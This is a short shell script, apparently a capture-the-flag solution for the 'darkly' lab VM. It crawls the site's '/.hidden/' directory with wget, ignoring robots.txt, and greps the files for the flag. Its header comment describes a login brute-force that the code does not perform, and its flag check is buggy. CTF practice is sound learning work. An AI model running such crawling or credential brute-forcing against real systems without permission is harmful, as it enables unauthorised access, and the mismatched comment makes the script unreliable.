#!/bin/sh

## script to brute force the login page based on two dictionnaries (passwords,
## and usernames). It loop through the signin page with different credentials.
## As the page send an error image we can grep that and check if there is one.
## If none, credentials are good
## -v to see which combinaison are tested

if [ -z "$1" ]
  then
    echo "No argument supplied";
    echo "Usage : ./getflag.sh [ip_addr]"
    echo "[ip_addr] = your darkly VM's IP (example : 192.168.122.49)"
	exit 1
fi

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo " - Creating '$1' folder"
mkdir -p $1
cd $1
echo " - Entering /$1"
echo " - Downloading all files from ${YELLOW}$1/.hidden/${NC} except index.* --this may take some time"

# -q for quiet, -nd for disabling hierarchy when creating folders, -r for recurse
# - l 0 for infinite depth, -np to download only file below a certain hierarchy
# -e robots=off to not respect the robots file, -R "index.*" to reject all index files
wget -q -np -nd -r -l 0 -e robots=off "$1/.hidden/" -R "index.*"
echo "${YELLOW} - All files downloaded, searching for flag...${NC}"
res=$(grep -E "^[0-9a-z]+$" *)
if [ -n $res ]; then
	echo "${GREEN} - GOTCHA -> $res${NC}"
else
  echo "No flag found with the pattern ^[0-9a-z]+$"
fi